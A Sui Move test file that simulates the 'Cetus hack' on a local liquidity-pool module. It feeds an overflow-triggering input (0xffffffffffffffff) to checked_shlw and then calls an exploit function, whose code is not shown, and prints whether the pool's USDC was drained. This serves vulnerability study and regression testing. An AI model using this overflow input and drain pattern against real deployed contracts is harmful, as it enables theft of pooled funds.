#[test_only]
module project::test_liquidity_pool {
    use sui::test_scenario;
    use project::liquidity_pool::{Self, Pool};
    use std::debug;

    #[test]
    fun test_cetus_hack() {
        debug::print(&b"Starting test_cetus_hack with sender @0x1".to_string());
        let mut scenario = test_scenario::begin(@0x1);
        let ctx = test_scenario::ctx(&mut scenario);

        debug::print(&b"Creating pool...".to_string());
        liquidity_pool::create_pool(ctx);
        test_scenario::next_tx(&mut scenario, @0x1);

        debug::print(&b"Fetching pool from sender...".to_string());
        let mut pool = test_scenario::take_from_sender<Pool>(&mut scenario);
        let initial_usdc = liquidity_pool::get_token_b(&pool);
        debug::print(&b"Initial USDC in pool: ".to_string());
        debug::print(&initial_usdc);

        let input_normal = 1000;
        debug::print(&b"Testing checked_shlw with normal input: ".to_string());
        debug::print(&input_normal);
        let (result, overflow) = liquidity_pool::checked_shlw(input_normal);
        debug::print(&b"Result: ".to_string());
        debug::print(&result);
        debug::print(&b"Overflow: ".to_string());
        debug::print(&overflow);
        if (overflow) {
            debug::print(&b"Unexpected overflow for normal input!".to_string());
        } else if (result != (input_normal << 64u8)) {
            debug::print(&b"checked_shlw returned incorrect result for normal input!".to_string());
        } else {
            debug::print(&b"checked_shlw passed for normal input".to_string());
        };

        debug::print(&b"Adding liquidity with normal input...".to_string());
        let lp_tokens = liquidity_pool::add_liquidity(&mut pool, input_normal);
        debug::print(&b"LP tokens created: ".to_string());
        debug::print(&lp_tokens);
        let usdc_withdrawn = liquidity_pool::remove_liquidity(&mut pool, lp_tokens);
        let usdc_after_normal = liquidity_pool::get_token_b(&pool);
        debug::print(&b"USDC withdrawn (normal): ".to_string());
        debug::print(&usdc_withdrawn);
        debug::print(&b"USDC remaining after normal input: ".to_string());
        debug::print(&usdc_after_normal);

        let input_hack = 0xffffffffffffffff;
        debug::print(&b"Testing checked_shlw with hack input: ".to_string());
        debug::print(&input_hack);
        let (result, overflow) = liquidity_pool::checked_shlw(input_hack);
        debug::print(&b"Result: ".to_string());
        debug::print(&result);
        debug::print(&b"Overflow: ".to_string());
        debug::print(&overflow);
        if (overflow) {
            debug::print(&b"Unexpected overflow for hack input!".to_string());
        } else if (result != (input_hack << 64u8)) {
            debug::print(&b"checked_shlw returned incorrect result for hack input!".to_string());
        } else {
            debug::print(&b"checked_shlw passed: returned large value (Cetus bug)".to_string());
        };

        debug::print(&b"Simulating exploit with hack input...".to_string());
        let usdc_withdrawn_hack = liquidity_pool::exploit(&mut pool, input_hack);
        let final_usdc = liquidity_pool::get_token_b(&pool);
        debug::print(&b"USDC withdrawn (hack): ".to_string());
        debug::print(&usdc_withdrawn_hack);
        debug::print(&b"USDC remaining after hack: ".to_string());
        debug::print(&final_usdc);
        if (usdc_withdrawn_hack == 0) {
            debug::print(&b"Exploit failed: no USDC withdrawn!".to_string());
        } else if (final_usdc >= usdc_after_normal) {
            debug::print(&b"Exploit failed: pool USDC did not decrease!".to_string());
        } else {
            debug::print(&b"Exploit succeeded: pool drained!".to_string());
        };

        debug::print(&b"Returning pool to sender...".to_string());
        test_scenario::return_to_sender(&mut scenario, pool);
        debug::print(&b"Ending test scenario".to_string());
        test_scenario::end(scenario);
    }
}